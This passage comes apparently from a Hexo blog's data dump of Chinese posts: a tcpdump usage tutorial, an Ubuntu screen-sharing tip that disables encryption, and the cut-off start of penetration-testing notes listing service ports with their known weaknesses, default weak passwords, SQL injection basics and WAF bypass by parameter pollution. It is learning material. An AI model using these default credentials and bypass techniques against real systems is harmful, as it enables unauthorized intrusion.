【步骤】 ##\n\n### 安装 ###\n\n\ntcpdump一般在linux服务器上是默认安装的,也可以说tcpdump是linux服务器端一个命令,可以用whereis命令查看安装位置;\n\n![1](https://i.imgur.com/i32BldG.png)\n\n用`tcpdump -help`查看帮助\t\n\n![2](https://i.imgur.com/cbMrq2X.png)\n\n### 常用命令选项 ###\n\n> 跟进不同用户的权限,如果需要sudo的,在命令前面加上sudo\n\t\n#### 指定要抓的数据包的数量 ####\n\n指定要抓的数据包的数量,指定\"-c 10\"将获取10个包,但可能已经处理了100个包,只不过只有10个包是满足条件的包。\n\n`tcpdump -c 10`\n\n![3](https://i.imgur.com/maAUOo6.png)\n\n#### 查看哪些端口可以抓包 ####\n\t\n`tcpdump -D`\n\n![4](https://i.imgur.com/OgWm7o4.png)\n\n#### 指定接口 ####\n\n`tcpdump -i eth0 -c 10`\n\n![5](https://i.imgur.com/JYZyM0u.png)\n\n#### -n和-nn \n\n-n: 对地址以数字方式显式,否则显式为主机名,也就是说-n选项不做主机名解析\n\n-nn: 把端口显示为数值,否则显示端口服务名\n\n对比下上图`tcpdump -i eth0 -c 10`红色方框的部分\n\n`tcpdump -i eth0 -c 10 -n`\n\n`tcpdump -i eth0 -c 10 -nn`\n\n![6](https://i.imgur.com/IeFHwOL.png)\n\n#### -x和-xx;-X和-XX,最常用的是-XX\n\n-x：以16进制打印出每个包的数据(不包括连接层的头部)\n\n-xx：以16进制打印出每个包的数据\n\n-X：输出包头部的数据,以16进制和ASCII两种方式同时输出（不包括连接层的头部）\n\n-XX：输出包头部的数据,会以16进制和ASCII两种方式同时输出。\n\t\n![7](https://i.imgur.com/ozN3Uef.png)\n\n![8](https://i.imgur.com/PjSKRna.png)\n\n#### -v，-vv，-vvv答应详细输出\n\n一个比一个详细，看一下吧\n\n如果没带-v或者-vv选项的时候，会有如下提示\n\n![9](https://i.imgur.com/9hsei8t.png)\n\n对比一下带-v和不带-v的（`tcpdump -i eth0 -c 10 -nn`）区别，会多输出一些信息。\n\n![10](https://i.imgur.com/Ko5X6wn.png)\n\n#### 包保存到指定文件-w，从指定文件读取包答应到屏幕-r\n\n![11](https://i.imgur.com/JNiPpWS.png)\n\n![12](https://i.imgur.com/lY5hUnm.png)\n\n### 常用过滤字段 ###\n\n#### 过滤指定主机 ####\n\n首先ping下，看看ip是多少，然后用host过滤，抓到的都是指定host的包\n\n`tcpdump host 360.cn`\n\n![13](https://i.imgur.com/Hz3k3qH.png)\n\n#### 源与目的，src与dst ####\n\n`tcpdump -i eth0 -c 10 -nn src host 360.cn`\n\n`tcpdump -i eth0 -c 10 -nn dst host 360.cn`\n\n![14](https://i.imgur.com/4iM4VTS.png)\n\n`tcpdump -i eth0 -c 10 -nn src host 36.110.213.49`\n\n`tcpdump -i eth0 -c 10 -nn dst host 36.110.213.49`\n\n![15](https://i.imgur.com/MLaCZEj.png)\n\n#### 协议过滤 ####\n\n过滤udp协议\n\n`tcpdump -i eth0 -c 10 -nn udp`\n\n![16](https://i.imgur.com/ea8zQXs.png)\n\n抓ping包\n\n`tcpdump -i eth0 -c 10 -nn icmp`\n\n![17](https://i.imgur.com/W8602BO.png)\n\n#### 过滤网段 ####\n\n`tcpdump -i eth0 -c 10 -nn net 10.60`\n\n![18](https://i.imgur.com/2Y9swSM.png)\n\n#### 过滤端口 ####\n\n`tcpdump -c 5 udp port 53`\n\n![19](https://i.imgur.com/P6iJhc3.png)\n\n#### 协议字段过滤 ####\n\n表达式单元之间可以使用操作符\" and / && / or / || / not / ! \"进行连接\n\n过滤syn包和fin包\n\n`tcpdump -i eth0 -c 3 -nn 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'`\n\n![20](https://i.imgur.com/vyNC7VE.png)\n\n过滤tcp 80端口，ip包长度大于1000的包（ip[2:2]表示整个ip数据包的长度）\n\n`tcpdump -i eth0 -c 1 -nn 'tcp port 80 and ip[2:2] > 1000'`\n\n![21](https://i.imgur.com/OFtQNEF.png)\n\n过滤icmp的reply包\n\n`tcpdump -i eth0 -c 1 -nn 'icmp[icmptype] == icmp-echoreply'`\n\n![22](https://i.imgur.com/7PLTIWu.png)\n\n","source":"_posts/Tcpdump使用实验.md","raw":"---\ntitle: Tcpdump使用实验\ndate: 2018-09-20 09:09:12\ntags:\ncategories: 工具\n---\n# <center>Tcpdump使用实验</center> # \n\n## 【目的】 ##\n\n学习使用tcpdump工具，tcpdump是最常用的网络数据分析工具之一。\n\n## 【原理】 ##\n\ntcpdump和wireshark一样,是一个抓包工具,基于libpcap开发的,过滤机制使用内核的BPF过滤,在linux下使用,也可以把tcpdump当成linux的命令。多数linux服务器是不按照图形界面的，在这种情况下，就可以使用tcpdump。\n\n## 【步骤】 ##\n\n### 安装 ###\n\n\ntcpdump一般在linux服务器上是默认安装的,也可以说tcpdump是linux服务器端一个命令,可以用whereis命令查看安装位置;\n\n![1](https://i.imgur.com/i32BldG.png)\n\n用`tcpdump -help`查看帮助\t\n\n![2](https://i.imgur.com/cbMrq2X.png)\n\n### 常用命令选项 ###\n\n> 跟进不同用户的权限,如果需要sudo的,在命令前面加上sudo\n\t\n#### 指定要抓的数据包的数量 ####\n\n指定要抓的数据包的数量,指定\"-c 10\"将获取10个包,但可能已经处理了100个包,只不过只有10个包是满足条件的包。\n\n`tcpdump -c 10`\n\n![3](https://i.imgur.com/maAUOo6.png)\n\n#### 查看哪些端口可以抓包 ####\n\t\n`tcpdump -D`\n\n![4](https://i.imgur.com/OgWm7o4.png)\n\n#### 指定接口 ####\n\n`tcpdump -i eth0 -c 10`\n\n![5](https://i.imgur.com/JYZyM0u.png)\n\n#### -n和-nn \n\n-n: 对地址以数字方式显式,否则显式为主机名,也就是说-n选项不做主机名解析\n\n-nn: 把端口显示为数值,否则显示端口服务名\n\n对比下上图`tcpdump -i eth0 -c 10`红色方框的部分\n\n`tcpdump -i eth0 -c 10 -n`\n\n`tcpdump -i eth0 -c 10 -nn`\n\n![6](https://i.imgur.com/IeFHwOL.png)\n\n#### -x和-xx;-X和-XX,最常用的是-XX\n\n-x：以16进制打印出每个包的数据(不包括连接层的头部)\n\n-xx：以16进制打印出每个包的数据\n\n-X：输出包头部的数据,以16进制和ASCII两种方式同时输出（不包括连接层的头部）\n\n-XX：输出包头部的数据,会以16进制和ASCII两种方式同时输出。\n\t\n![7](https://i.imgur.com/ozN3Uef.png)\n\n![8](https://i.imgur.com/PjSKRna.png)\n\n#### -v，-vv，-vvv答应详细输出\n\n一个比一个详细，看一下吧\n\n如果没带-v或者-vv选项的时候，会有如下提示\n\n![9](https://i.imgur.com/9hsei8t.png)\n\n对比一下带-v和不带-v的（`tcpdump -i eth0 -c 10 -nn`）区别，会多输出一些信息。\n\n![10](https://i.imgur.com/Ko5X6wn.png)\n\n#### 包保存到指定文件-w，从指定文件读取包答应到屏幕-r\n\n![11](https://i.imgur.com/JNiPpWS.png)\n\n![12](https://i.imgur.com/lY5hUnm.png)\n\n### 常用过滤字段 ###\n\n#### 过滤指定主机 ####\n\n首先ping下，看看ip是多少，然后用host过滤，抓到的都是指定host的包\n\n`tcpdump host 360.cn`\n\n![13](https://i.imgur.com/Hz3k3qH.png)\n\n#### 源与目的，src与dst ####\n\n`tcpdump -i eth0 -c 10 -nn src host 360.cn`\n\n`tcpdump -i eth0 -c 10 -nn dst host 360.cn`\n\n![14](https://i.imgur.com/4iM4VTS.png)\n\n`tcpdump -i eth0 -c 10 -nn src host 36.110.213.49`\n\n`tcpdump -i eth0 -c 10 -nn dst host 36.110.213.49`\n\n![15](https://i.imgur.com/MLaCZEj.png)\n\n#### 协议过滤 ####\n\n过滤udp协议\n\n`tcpdump -i eth0 -c 10 -nn udp`\n\n![16](https://i.imgur.com/ea8zQXs.png)\n\n抓ping包\n\n`tcpdump -i eth0 -c 10 -nn icmp`\n\n![17](https://i.imgur.com/W8602BO.png)\n\n#### 过滤网段 ####\n\n`tcpdump -i eth0 -c 10 -nn net 10.60`\n\n![18](https://i.imgur.com/2Y9swSM.png)\n\n#### 过滤端口 ####\n\n`tcpdump -c 5 udp port 53`\n\n![19](https://i.imgur.com/P6iJhc3.png)\n\n#### 协议字段过滤 ####\n\n表达式单元之间可以使用操作符\" and / && / or / || / not / ! \"进行连接\n\n过滤syn包和fin包\n\n`tcpdump -i eth0 -c 3 -nn 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'`\n\n![20](https://i.imgur.com/vyNC7VE.png)\n\n过滤tcp 80端口，ip包长度大于1000的包（ip[2:2]表示整个ip数据包的长度）\n\n`tcpdump -i eth0 -c 1 -nn 'tcp port 80 and ip[2:2] > 1000'`\n\n![21](https://i.imgur.com/OFtQNEF.png)\n\n过滤icmp的reply包\n\n`tcpdump -i eth0 -c 1 -nn 'icmp[icmptype] == icmp-echoreply'`\n\n![22](https://i.imgur.com/7PLTIWu.png)\n\n","slug":"Tcpdump使用实验","published":1,"updated":"2019-06-19T17:23:13.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbt000l4dsbfzilrhpm","content":"<h1 id=\"Tcpdump使用实验\"><a href=\"#Tcpdump使用实验\" class=\"headerlink\" title=\"Tcpdump使用实验\"></a><center>Tcpdump使用实验</center></h1><h2 id=\"【目的】\"><a href=\"#【目的】\" class=\"headerlink\" title=\"【目的】\"></a>【目的】</h2><p>学习使用tcpdump工具，tcpdump是最常用的网络数据分析工具之一。</p>\n<h2 id=\"【原理】\"><a href=\"#【原理】\" class=\"headerlink\" title=\"【原理】\"></a>【原理】</h2><p>tcpdump和wireshark一样,是一个抓包工具,基于libpcap开发的,过滤机制使用内核的BPF过滤,在linux下使用,也可以把tcpdump当成linux的命令。多数linux服务器是不按照图形界面的，在这种情况下，就可以使用tcpdump。</p>\n<h2 id=\"【步骤】\"><a href=\"#【步骤】\" class=\"headerlink\" title=\"【步骤】\"></a>【步骤】</h2><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>tcpdump一般在linux服务器上是默认安装的,也可以说tcpdump是linux服务器端一个命令,可以用whereis命令查看安装位置;</p>\n<p><img src=\"https://i.imgur.com/i32BldG.png\" alt=\"1\"></p>\n<p>用<code>tcpdump -help</code>查看帮助    </p>\n<p><img src=\"https://i.imgur.com/cbMrq2X.png\" alt=\"2\"></p>\n<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><blockquote>\n<p>跟进不同用户的权限,如果需要sudo的,在命令前面加上sudo</p>\n</blockquote>\n<h4 id=\"指定要抓的数据包的数量\"><a href=\"#指定要抓的数据包的数量\" class=\"headerlink\" title=\"指定要抓的数据包的数量\"></a>指定要抓的数据包的数量</h4><p>指定要抓的数据包的数量,指定”-c 10”将获取10个包,但可能已经处理了100个包,只不过只有10个包是满足条件的包。</p>\n<p><code>tcpdump -c 10</code></p>\n<p><img src=\"https://i.imgur.com/maAUOo6.png\" alt=\"3\"></p>\n<h4 id=\"查看哪些端口可以抓包\"><a href=\"#查看哪些端口可以抓包\" class=\"headerlink\" title=\"查看哪些端口可以抓包\"></a>查看哪些端口可以抓包</h4><p><code>tcpdump -D</code></p>\n<p><img src=\"https://i.imgur.com/OgWm7o4.png\" alt=\"4\"></p>\n<h4 id=\"指定接口\"><a href=\"#指定接口\" class=\"headerlink\" title=\"指定接口\"></a>指定接口</h4><p><code>tcpdump -i eth0 -c 10</code></p>\n<p><img src=\"https://i.imgur.com/JYZyM0u.png\" alt=\"5\"></p>\n<h4 id=\"n和-nn\"><a href=\"#n和-nn\" class=\"headerlink\" title=\"-n和-nn\"></a>-n和-nn</h4><p>-n: 对地址以数字方式显式,否则显式为主机名,也就是说-n选项不做主机名解析</p>\n<p>-nn: 把端口显示为数值,否则显示端口服务名</p>\n<p>对比下上图<code>tcpdump -i eth0 -c 10</code>红色方框的部分</p>\n<p><code>tcpdump -i eth0 -c 10 -n</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn</code></p>\n<p><img src=\"https://i.imgur.com/IeFHwOL.png\" alt=\"6\"></p>\n<h4 id=\"x和-xx-X和-XX-最常用的是-XX\"><a href=\"#x和-xx-X和-XX-最常用的是-XX\" class=\"headerlink\" title=\"-x和-xx;-X和-XX,最常用的是-XX\"></a>-x和-xx;-X和-XX,最常用的是-XX</h4><p>-x：以16进制打印出每个包的数据(不包括连接层的头部)</p>\n<p>-xx：以16进制打印出每个包的数据</p>\n<p>-X：输出包头部的数据,以16进制和ASCII两种方式同时输出（不包括连接层的头部）</p>\n<p>-XX：输出包头部的数据,会以16进制和ASCII两种方式同时输出。</p>\n<p><img src=\"https://i.imgur.com/ozN3Uef.png\" alt=\"7\"></p>\n<p><img src=\"https://i.imgur.com/PjSKRna.png\" alt=\"8\"></p>\n<h4 id=\"v，-vv，-vvv答应详细输出\"><a href=\"#v，-vv，-vvv答应详细输出\" class=\"headerlink\" title=\"-v，-vv，-vvv答应详细输出\"></a>-v，-vv，-vvv答应详细输出</h4><p>一个比一个详细，看一下吧</p>\n<p>如果没带-v或者-vv选项的时候，会有如下提示</p>\n<p><img src=\"https://i.imgur.com/9hsei8t.png\" alt=\"9\"></p>\n<p>对比一下带-v和不带-v的（<code>tcpdump -i eth0 -c 10 -nn</code>）区别，会多输出一些信息。</p>\n<p><img src=\"https://i.imgur.com/Ko5X6wn.png\" alt=\"10\"></p>\n<h4 id=\"包保存到指定文件-w，从指定文件读取包答应到屏幕-r\"><a href=\"#包保存到指定文件-w，从指定文件读取包答应到屏幕-r\" class=\"headerlink\" title=\"包保存到指定文件-w，从指定文件读取包答应到屏幕-r\"></a>包保存到指定文件-w，从指定文件读取包答应到屏幕-r</h4><p><img src=\"https://i.imgur.com/JNiPpWS.png\" alt=\"11\"></p>\n<p><img src=\"https://i.imgur.com/lY5hUnm.png\" alt=\"12\"></p>\n<h3 id=\"常用过滤字段\"><a href=\"#常用过滤字段\" class=\"headerlink\" title=\"常用过滤字段\"></a>常用过滤字段</h3><h4 id=\"过滤指定主机\"><a href=\"#过滤指定主机\" class=\"headerlink\" title=\"过滤指定主机\"></a>过滤指定主机</h4><p>首先ping下，看看ip是多少，然后用host过滤，抓到的都是指定host的包</p>\n<p><code>tcpdump host 360.cn</code></p>\n<p><img src=\"https://i.imgur.com/Hz3k3qH.png\" alt=\"13\"></p>\n<h4 id=\"源与目的，src与dst\"><a href=\"#源与目的，src与dst\" class=\"headerlink\" title=\"源与目的，src与dst\"></a>源与目的，src与dst</h4><p><code>tcpdump -i eth0 -c 10 -nn src host 360.cn</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn dst host 360.cn</code></p>\n<p><img src=\"https://i.imgur.com/4iM4VTS.png\" alt=\"14\"></p>\n<p><code>tcpdump -i eth0 -c 10 -nn src host 36.110.213.49</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn dst host 36.110.213.49</code></p>\n<p><img src=\"https://i.imgur.com/MLaCZEj.png\" alt=\"15\"></p>\n<h4 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h4><p>过滤udp协议</p>\n<p><code>tcpdump -i eth0 -c 10 -nn udp</code></p>\n<p><img src=\"https://i.imgur.com/ea8zQXs.png\" alt=\"16\"></p>\n<p>抓ping包</p>\n<p><code>tcpdump -i eth0 -c 10 -nn icmp</code></p>\n<p><img src=\"https://i.imgur.com/W8602BO.png\" alt=\"17\"></p>\n<h4 id=\"过滤网段\"><a href=\"#过滤网段\" class=\"headerlink\" title=\"过滤网段\"></a>过滤网段</h4><p><code>tcpdump -i eth0 -c 10 -nn net 10.60</code></p>\n<p><img src=\"https://i.imgur.com/2Y9swSM.png\" alt=\"18\"></p>\n<h4 id=\"过滤端口\"><a href=\"#过滤端口\" class=\"headerlink\" title=\"过滤端口\"></a>过滤端口</h4><p><code>tcpdump -c 5 udp port 53</code></p>\n<p><img src=\"https://i.imgur.com/P6iJhc3.png\" alt=\"19\"></p>\n<h4 id=\"协议字段过滤\"><a href=\"#协议字段过滤\" class=\"headerlink\" title=\"协议字段过滤\"></a>协议字段过滤</h4><p>表达式单元之间可以使用操作符” and / &amp;&amp; / or / || / not / ! “进行连接</p>\n<p>过滤syn包和fin包</p>\n<p><code>tcpdump -i eth0 -c 3 -nn &#39;tcp[tcpflags] &amp; (tcp-syn|tcp-fin) != 0&#39;</code></p>\n<p><img src=\"https://i.imgur.com/vyNC7VE.png\" alt=\"20\"></p>\n<p>过滤tcp 80端口，ip包长度大于1000的包（ip[2:2]表示整个ip数据包的长度）</p>\n<p><code>tcpdump -i eth0 -c 1 -nn &#39;tcp port 80 and ip[2:2] &gt; 1000&#39;</code></p>\n<p><img src=\"https://i.imgur.com/OFtQNEF.png\" alt=\"21\"></p>\n<p>过滤icmp的reply包</p>\n<p><code>tcpdump -i eth0 -c 1 -nn &#39;icmp[icmptype] == icmp-echoreply&#39;</code></p>\n<p><img src=\"https://i.imgur.com/7PLTIWu.png\" alt=\"22\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Tcpdump使用实验\"><a href=\"#Tcpdump使用实验\" class=\"headerlink\" title=\"Tcpdump使用实验\"></a><center>Tcpdump使用实验</center></h1><h2 id=\"【目的】\"><a href=\"#【目的】\" class=\"headerlink\" title=\"【目的】\"></a>【目的】</h2><p>学习使用tcpdump工具，tcpdump是最常用的网络数据分析工具之一。</p>\n<h2 id=\"【原理】\"><a href=\"#【原理】\" class=\"headerlink\" title=\"【原理】\"></a>【原理】</h2><p>tcpdump和wireshark一样,是一个抓包工具,基于libpcap开发的,过滤机制使用内核的BPF过滤,在linux下使用,也可以把tcpdump当成linux的命令。多数linux服务器是不按照图形界面的，在这种情况下，就可以使用tcpdump。</p>\n<h2 id=\"【步骤】\"><a href=\"#【步骤】\" class=\"headerlink\" title=\"【步骤】\"></a>【步骤】</h2><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>tcpdump一般在linux服务器上是默认安装的,也可以说tcpdump是linux服务器端一个命令,可以用whereis命令查看安装位置;</p>\n<p><img src=\"https://i.imgur.com/i32BldG.png\" alt=\"1\"></p>\n<p>用<code>tcpdump -help</code>查看帮助    </p>\n<p><img src=\"https://i.imgur.com/cbMrq2X.png\" alt=\"2\"></p>\n<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><blockquote>\n<p>跟进不同用户的权限,如果需要sudo的,在命令前面加上sudo</p>\n</blockquote>\n<h4 id=\"指定要抓的数据包的数量\"><a href=\"#指定要抓的数据包的数量\" class=\"headerlink\" title=\"指定要抓的数据包的数量\"></a>指定要抓的数据包的数量</h4><p>指定要抓的数据包的数量,指定”-c 10”将获取10个包,但可能已经处理了100个包,只不过只有10个包是满足条件的包。</p>\n<p><code>tcpdump -c 10</code></p>\n<p><img src=\"https://i.imgur.com/maAUOo6.png\" alt=\"3\"></p>\n<h4 id=\"查看哪些端口可以抓包\"><a href=\"#查看哪些端口可以抓包\" class=\"headerlink\" title=\"查看哪些端口可以抓包\"></a>查看哪些端口可以抓包</h4><p><code>tcpdump -D</code></p>\n<p><img src=\"https://i.imgur.com/OgWm7o4.png\" alt=\"4\"></p>\n<h4 id=\"指定接口\"><a href=\"#指定接口\" class=\"headerlink\" title=\"指定接口\"></a>指定接口</h4><p><code>tcpdump -i eth0 -c 10</code></p>\n<p><img src=\"https://i.imgur.com/JYZyM0u.png\" alt=\"5\"></p>\n<h4 id=\"n和-nn\"><a href=\"#n和-nn\" class=\"headerlink\" title=\"-n和-nn\"></a>-n和-nn</h4><p>-n: 对地址以数字方式显式,否则显式为主机名,也就是说-n选项不做主机名解析</p>\n<p>-nn: 把端口显示为数值,否则显示端口服务名</p>\n<p>对比下上图<code>tcpdump -i eth0 -c 10</code>红色方框的部分</p>\n<p><code>tcpdump -i eth0 -c 10 -n</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn</code></p>\n<p><img src=\"https://i.imgur.com/IeFHwOL.png\" alt=\"6\"></p>\n<h4 id=\"x和-xx-X和-XX-最常用的是-XX\"><a href=\"#x和-xx-X和-XX-最常用的是-XX\" class=\"headerlink\" title=\"-x和-xx;-X和-XX,最常用的是-XX\"></a>-x和-xx;-X和-XX,最常用的是-XX</h4><p>-x：以16进制打印出每个包的数据(不包括连接层的头部)</p>\n<p>-xx：以16进制打印出每个包的数据</p>\n<p>-X：输出包头部的数据,以16进制和ASCII两种方式同时输出（不包括连接层的头部）</p>\n<p>-XX：输出包头部的数据,会以16进制和ASCII两种方式同时输出。</p>\n<p><img src=\"https://i.imgur.com/ozN3Uef.png\" alt=\"7\"></p>\n<p><img src=\"https://i.imgur.com/PjSKRna.png\" alt=\"8\"></p>\n<h4 id=\"v，-vv，-vvv答应详细输出\"><a href=\"#v，-vv，-vvv答应详细输出\" class=\"headerlink\" title=\"-v，-vv，-vvv答应详细输出\"></a>-v，-vv，-vvv答应详细输出</h4><p>一个比一个详细，看一下吧</p>\n<p>如果没带-v或者-vv选项的时候，会有如下提示</p>\n<p><img src=\"https://i.imgur.com/9hsei8t.png\" alt=\"9\"></p>\n<p>对比一下带-v和不带-v的（<code>tcpdump -i eth0 -c 10 -nn</code>）区别，会多输出一些信息。</p>\n<p><img src=\"https://i.imgur.com/Ko5X6wn.png\" alt=\"10\"></p>\n<h4 id=\"包保存到指定文件-w，从指定文件读取包答应到屏幕-r\"><a href=\"#包保存到指定文件-w，从指定文件读取包答应到屏幕-r\" class=\"headerlink\" title=\"包保存到指定文件-w，从指定文件读取包答应到屏幕-r\"></a>包保存到指定文件-w，从指定文件读取包答应到屏幕-r</h4><p><img src=\"https://i.imgur.com/JNiPpWS.png\" alt=\"11\"></p>\n<p><img src=\"https://i.imgur.com/lY5hUnm.png\" alt=\"12\"></p>\n<h3 id=\"常用过滤字段\"><a href=\"#常用过滤字段\" class=\"headerlink\" title=\"常用过滤字段\"></a>常用过滤字段</h3><h4 id=\"过滤指定主机\"><a href=\"#过滤指定主机\" class=\"headerlink\" title=\"过滤指定主机\"></a>过滤指定主机</h4><p>首先ping下，看看ip是多少，然后用host过滤，抓到的都是指定host的包</p>\n<p><code>tcpdump host 360.cn</code></p>\n<p><img src=\"https://i.imgur.com/Hz3k3qH.png\" alt=\"13\"></p>\n<h4 id=\"源与目的，src与dst\"><a href=\"#源与目的，src与dst\" class=\"headerlink\" title=\"源与目的，src与dst\"></a>源与目的，src与dst</h4><p><code>tcpdump -i eth0 -c 10 -nn src host 360.cn</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn dst host 360.cn</code></p>\n<p><img src=\"https://i.imgur.com/4iM4VTS.png\" alt=\"14\"></p>\n<p><code>tcpdump -i eth0 -c 10 -nn src host 36.110.213.49</code></p>\n<p><code>tcpdump -i eth0 -c 10 -nn dst host 36.110.213.49</code></p>\n<p><img src=\"https://i.imgur.com/MLaCZEj.png\" alt=\"15\"></p>\n<h4 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h4><p>过滤udp协议</p>\n<p><code>tcpdump -i eth0 -c 10 -nn udp</code></p>\n<p><img src=\"https://i.imgur.com/ea8zQXs.png\" alt=\"16\"></p>\n<p>抓ping包</p>\n<p><code>tcpdump -i eth0 -c 10 -nn icmp</code></p>\n<p><img src=\"https://i.imgur.com/W8602BO.png\" alt=\"17\"></p>\n<h4 id=\"过滤网段\"><a href=\"#过滤网段\" class=\"headerlink\" title=\"过滤网段\"></a>过滤网段</h4><p><code>tcpdump -i eth0 -c 10 -nn net 10.60</code></p>\n<p><img src=\"https://i.imgur.com/2Y9swSM.png\" alt=\"18\"></p>\n<h4 id=\"过滤端口\"><a href=\"#过滤端口\" class=\"headerlink\" title=\"过滤端口\"></a>过滤端口</h4><p><code>tcpdump -c 5 udp port 53</code></p>\n<p><img src=\"https://i.imgur.com/P6iJhc3.png\" alt=\"19\"></p>\n<h4 id=\"协议字段过滤\"><a href=\"#协议字段过滤\" class=\"headerlink\" title=\"协议字段过滤\"></a>协议字段过滤</h4><p>表达式单元之间可以使用操作符” and / &amp;&amp; / or / || / not / ! “进行连接</p>\n<p>过滤syn包和fin包</p>\n<p><code>tcpdump -i eth0 -c 3 -nn &#39;tcp[tcpflags] &amp; (tcp-syn|tcp-fin) != 0&#39;</code></p>\n<p><img src=\"https://i.imgur.com/vyNC7VE.png\" alt=\"20\"></p>\n<p>过滤tcp 80端口，ip包长度大于1000的包（ip[2:2]表示整个ip数据包的长度）</p>\n<p><code>tcpdump -i eth0 -c 1 -nn &#39;tcp port 80 and ip[2:2] &gt; 1000&#39;</code></p>\n<p><img src=\"https://i.imgur.com/OFtQNEF.png\" alt=\"21\"></p>\n<p>过滤icmp的reply包</p>\n<p><code>tcpdump -i eth0 -c 1 -nn &#39;icmp[icmptype] == icmp-echoreply&#39;</code></p>\n<p><img src=\"https://i.imgur.com/7PLTIWu.png\" alt=\"22\"></p>\n"},{"title":"Ubuntu18.04屏幕共享","date":"2018-11-08T14:14:59.000Z","_content":"\n# Ubuntu18.04屏幕共享\n\n---\n\n![001](/img/ubuntu/ScreenSharing/001.png)\n\n使用`dconf Editor`,没有的就使用`apt-get`安装\n\n修改桌面配置。\n\n![002](/img/ubuntu/ScreenSharing/002.png)\n\n设置`require-encryption`为`false`,`view-only`为`true`.\n\n局域网内的就可以通过ip访问了。","source":"_posts/Ubuntu18-04屏幕共享.md","raw":"---\ntitle: Ubuntu18.04屏幕共享\ndate: 2018-11-08 22:14:59\ntags: [疑难杂症]\ncategories: ubuntu\n---\n\n# Ubuntu18.04屏幕共享\n\n---\n\n![001](/img/ubuntu/ScreenSharing/001.png)\n\n使用`dconf Editor`,没有的就使用`apt-get`安装\n\n修改桌面配置。\n\n![002](/img/ubuntu/ScreenSharing/002.png)\n\n设置`require-encryption`为`false`,`view-only`为`true`.\n\n局域网内的就可以通过ip访问了。","slug":"Ubuntu18-04屏幕共享","published":1,"updated":"2019-06-19T17:23:13.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istby000q4dsb5yer8rk6","content":"<h1 id=\"Ubuntu18-04屏幕共享\"><a href=\"#Ubuntu18-04屏幕共享\" class=\"headerlink\" title=\"Ubuntu18.04屏幕共享\"></a>Ubuntu18.04屏幕共享</h1><hr>\n<p><img src=\"/img/ubuntu/ScreenSharing/001.png\" alt=\"001\"></p>\n<p>使用<code>dconf Editor</code>,没有的就使用<code>apt-get</code>安装</p>\n<p>修改桌面配置。</p>\n<p><img src=\"/img/ubuntu/ScreenSharing/002.png\" alt=\"002\"></p>\n<p>设置<code>require-encryption</code>为<code>false</code>,<code>view-only</code>为<code>true</code>.</p>\n<p>局域网内的就可以通过ip访问了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ubuntu18-04屏幕共享\"><a href=\"#Ubuntu18-04屏幕共享\" class=\"headerlink\" title=\"Ubuntu18.04屏幕共享\"></a>Ubuntu18.04屏幕共享</h1><hr>\n<p><img src=\"/img/ubuntu/ScreenSharing/001.png\" alt=\"001\"></p>\n<p>使用<code>dconf Editor</code>,没有的就使用<code>apt-get</code>安装</p>\n<p>修改桌面配置。</p>\n<p><img src=\"/img/ubuntu/ScreenSharing/002.png\" alt=\"002\"></p>\n<p>设置<code>require-encryption</code>为<code>false</code>,<code>view-only</code>为<code>true</code>.</p>\n<p>局域网内的就可以通过ip访问了。</p>\n"},{"title":"Web基础知识","date":"2019-01-05T03:18:24.000Z","_content":"\n# 基础知识\n\n------\n\n## 常见的端口\n\n|      端口号       |     服务      |             漏洞              |\n| :---------------: | :-----------: | :---------------------------: |\n|        21         |      ftp      |                               |\n|        22         |      ssh      |                               |\n|        23         |    telnet     |                               |\n|        161        |     snmp      |                               |\n|        443        |    openssl    |           心脏滴血            |\n|        837        |     Rsync     |            未授权             |\n|       1433        |    MSSSQL     |                               |\n|       1521        |    Oracle     |                               |\n|       2375        |    docker     |            未授权             |\n|       3306        |     Mysql     |                               |\n|       3389        |   远程连接    |                               |\n|       5432        |  PostgreSQL   |                               |\n|       5900        |      vnc      |                               |\n|       6379        |     redis     |            未授权             |\n|  7001,7002,7003   |   Weblogic    |      默认弱口令，反序列       |\n|       9000        |  fastcgi-php  |                               |\n|     9200,9300     | elasticsearch |  CVE-2015-1427,CVE-2014-3120  |\n|       11211       |   memcache    |            未授权             |\n|    27017,27018    |    Mongodb    |          未授权访问           |\n|       1099        |      rmi      |           命令执行            |\n|     2601,2604     |     zebra     |     路由，默认密码 zebra      |\n|       3128        |     squid     |         代理默认端口          |\n|       4440        |    rundeck    |                               |\n|       4848        |   glassfish   | 中间件弱口令 admin/adminadmin |\n|       5984        |    CouchDB    |    http://xxx:5984/_utils/    |\n|       8000        |   jdwp java   |       调试接口命令执行        |\n|       9043        |   websphere   |      弱口令 admin/admin       |\n|       50000       |      SAP      |           命令执行            |\n| 50060,50070,50030 |    hadoop     |      默认端口未授权访问       |\n\n## SQL注入类型\n\n数字型，字符型，搜索型\n\n## 联合查询的条件（union select）\n\n1. 页面有注入回显\n2. 拼接的两个结果集必须有相同列数,列的数据类型相同\n\n## DNSlog知道吗？是否能在Linux利用\n\nhttps://www.anquanke.com/post/id/98096\n\n![001](/img/knowledge/web/001.jpg)\n\nload_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的UNC路径\n\n## 绕过waf的方法\n\nhttps://www.freebuf.com/column/163469.html\n\n## 利用过参数污染绕过waf吗？\n\n在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。\n\n```\nGET /foo?par1=val1&par2=val2 HTTP/1.1\nUser-Agent: 